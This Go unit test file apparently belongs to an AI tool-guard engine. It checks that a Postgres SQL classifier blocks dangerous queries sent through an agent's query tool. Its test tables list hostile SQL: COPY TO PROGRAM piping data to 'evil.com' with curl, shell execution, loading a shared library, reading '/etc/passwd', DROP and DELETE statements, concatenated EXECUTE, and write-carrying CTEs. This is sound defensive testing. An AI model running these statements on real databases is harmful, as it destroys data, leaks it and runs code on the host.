package engine_test

import (
	"testing"

	"github.com/dimaggi-ai/tool-guard-core/pkg/domain"
	"github.com/dimaggi-ai/tool-guard-core/pkg/engine"
	// Side-effect import registers the postgres classifier so the
	// engine tests below can exercise sql_classify dispatch end-to-end
	// without standing up the proxy.
	_ "github.com/dimaggi-ai/tool-guard-core/pkg/sqlguard/lite"
)

// fieldMap is the same shape evaluator builds via FlattenEnvelope —
// "tool_name", "parameters.sql", etc. Built by hand here so the unit
// test doesn't drag in envelope/policy plumbing.
func sqlFields(sql string) map[string]interface{} {
	return map[string]interface{}{
		"tool_name":      "query",
		"tool_group":     "database_ops",
		"parameters.sql": sql,
	}
}

func TestEvalSQLClassify_AllowsPureSelect(t *testing.T) {
	cond := domain.Condition{
		SQLClassify: &domain.SQLClassify{
			Field:   "parameters.sql",
			Dialect: "postgres",
			Require: domain.SQLRequire{
				TopLevelKinds: []string{"SELECT"},
				NoDynamicSQL:  true,
				NoProgramExec: true,
			},
		},
	}
	if engine.EvalCondition(cond, sqlFields("SELECT id, email FROM users WHERE id < 10")) {
		t.Fatalf("rule fired on a clean SELECT; expected allow (no fire)")
	}
}

func TestEvalSQLClassify_DeniesEveryBypassFamily(t *testing.T) {
	cond := domain.Condition{
		SQLClassify: &domain.SQLClassify{
			Field:   "parameters.sql",
			Dialect: "postgres",
			Require: domain.SQLRequire{
				TopLevelKinds: []string{"SELECT"},
				NoDynamicSQL:  true,
				NoProgramExec: true,
				AllowedFunctions: []string{
					"count", "sum", "avg", "min", "max",
					"now", "current_timestamp", "lower", "upper",
				},
			},
		},
	}
	bypasses := map[string]string{
		"DROP TABLE":             "DROP TABLE users",
		"DELETE FROM":            "DELETE FROM users",
		"UPDATE":                 "UPDATE users SET email = 'x'",
		"INSERT":                 "INSERT INTO users (id) VALUES (1)",
		"GRANT":                  "GRANT ALL ON users TO PUBLIC",
		"TRUNCATE":               "TRUNCATE TABLE users",
		"ALTER":                  "ALTER TABLE users ADD COLUMN x INT",
		"CREATE TABLE":           "CREATE TABLE foo (id INT)",
		"CREATE FUNCTION":        "CREATE FUNCTION f() RETURNS void AS $$ BEGIN END $$ LANGUAGE plpgsql",
		"DO + EXECUTE concat":    "DO $$ BEGIN EXECUTE 'DR'||'OP TABLE users'; END $$;",
		"CALL":                   "CALL pg_terminate_backend(1)",
		"COPY FROM PROGRAM":      "COPY users FROM PROGRAM 'whoami'",
		"COPY TO PROGRAM":        "COPY users TO PROGRAM 'curl evil.com -d @-'",
		"LOAD":                   "LOAD '/tmp/evil.so'",
		"SET ROLE":               "SET ROLE postgres",
		"DISCARD":                "DISCARD ALL",
		"BEGIN":                  "BEGIN",
		"multi-stmt":             "SELECT 1; DROP TABLE users",
		"SELECT pg_read_file":    "SELECT pg_read_file('/etc/passwd')",
		"SELECT pg_terminate":    "SELECT pg_terminate_backend(1)",
		"SELECT pg_ls_dir":       "SELECT pg_ls_dir('/etc')",
		// Note: garbage SQL like "SELECT FROM WHERE" is not caught
		// here under the lite (tokenizer) classifier — the DB itself
		// rejects it. The strict (pg_query_go) classifier returns a
		// parse error which fail-closes to deny. Tested separately.
	}
	for name, sql := range bypasses {
		t.Run(name, func(t *testing.T) {
			if !engine.EvalCondition(cond, sqlFields(sql)) {
				t.Fatalf("rule did NOT fire on %q (%s); expected fire = deny", name, sql)
			}
		})
	}
}

// Modifying CTE — top-level is SELECT but the CTE writes. Must fire
// the rule when TopLevelKinds limits to read-only.
func TestEvalSQLClassify_DeniesModifyingCTE(t *testing.T) {
	cond := domain.Condition{
		SQLClassify: &domain.SQLClassify{
			Field:   "parameters.sql",
			Dialect: "postgres",
			Require: domain.SQLRequire{
				TopLevelKinds: []string{"SELECT"},
				NoDynamicSQL:  true,
				NoProgramExec: true,
			},
		},
	}
	bypasses := []string{
		"WITH d AS (DELETE FROM users RETURNING id) SELECT * FROM d",
		"WITH u AS (UPDATE users SET email='x' RETURNING id) SELECT * FROM u",
		"WITH i AS (INSERT INTO users VALUES (99,'evil') RETURNING id) SELECT * FROM i",
		"WITH x AS (DELETE FROM users WHERE id < 100 RETURNING *) SELECT count(*) FROM x",
		`WITH q AS (SELECT * FROM (WITH del AS (DELETE FROM users RETURNING id)
			SELECT * FROM del) sub) SELECT * FROM q`,
	}
	for _, sql := range bypasses {
		t.Run(sql[:min(50, len(sql))], func(t *testing.T) {
			fields := map[string]interface{}{
				"tool_name":      "query",
				"parameters.sql": sql,
			}
			if !engine.EvalCondition(cond, fields) {
				t.Errorf("modifying-CTE BYPASS still open: %q did not fire the rule", sql)
			}
		})
	}
	// Sanity: clean SELECT still allowed.
	clean := map[string]interface{}{
		"tool_name":      "query",
		"parameters.sql": "WITH q AS (SELECT id FROM users) SELECT * FROM q",
	}
	if engine.EvalCondition(cond, clean) {
		t.Errorf("clean read-only CTE fired the rule (overblock)")
	}
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// FailClosed_UnsupportedDialect: the engine must DENY when the
// requested dialect has no registered classifier (no parser linked).
func TestEvalSQLClassify_FailsClosedOnUnknownDialect(t *testing.T) {
	cond := domain.Condition{
		SQLClassify: &domain.SQLClassify{
			Field:   "parameters.sql",
			Dialect: "snowflake", // not linked
			Require: domain.SQLRequire{TopLevelKinds: []string{"SELECT"}},
		},
	}
	if !engine.EvalCondition(cond, sqlFields("SELECT 1")) {
		t.Fatalf("rule did NOT fire on unknown dialect; expected fail-closed deny")
	}
}

// FailClosed_MissingField: rule must fire when the SQL field is absent
// or the wrong type. Defends against a caller that sends parameters.SQL
// (case-different) hoping to slip past the classifier.
func TestEvalSQLClassify_FailsClosedOnMissingField(t *testing.T) {
	cond := domain.Condition{
		SQLClassify: &domain.SQLClassify{
			Field:   "parameters.sql",
			Dialect: "postgres",
			Require: domain.SQLRequire{TopLevelKinds: []string{"SELECT"}},
		},
	}
	fields := map[string]interface{}{
		"tool_name":      "query",
		"parameters.SQL": "SELECT 1", // wrong case — engine doesn't find parameters.sql
	}
	if !engine.EvalCondition(cond, fields) {
		t.Fatalf("rule did NOT fire on missing parameters.sql; expected fail-closed deny")
	}
}

// And-composition: SQL classify fits inside the existing condition tree.
// This guards the integration: a real policy will AND the sql_classify
// against tool_name == "query" so the rule only fires for the query tool.
func TestEvalSQLClassify_ComposesWithAnd(t *testing.T) {
	cond := domain.Condition{
		And: []domain.Condition{
			{Field: "tool_name", Operator: domain.OpEq, Value: "query"},
			{SQLClassify: &domain.SQLClassify{
				Field:   "parameters.sql",
				Dialect: "postgres",
				Require: domain.SQLRequire{
					TopLevelKinds: []string{"SELECT"},
					NoDynamicSQL:  true,
					NoProgramExec: true,
				},
			}},
		},
	}
	// query + DROP → fire
	if !engine.EvalCondition(cond, sqlFields("DROP TABLE users")) {
		t.Errorf("did not fire on query + DROP")
	}
	// query + clean SELECT → no fire
	if engine.EvalCondition(cond, sqlFields("SELECT 1")) {
		t.Errorf("fired on query + clean SELECT")
	}
	// wrong tool + DROP → no fire (scope mismatch, AND short-circuits)
	wrongTool := map[string]interface{}{
		"tool_name":      "list_tables",
		"parameters.sql": "DROP TABLE users",
	}
	if engine.EvalCondition(cond, wrongTool) {
		t.Errorf("fired on wrong tool with DROP (AND should short-circuit)")
	}
}
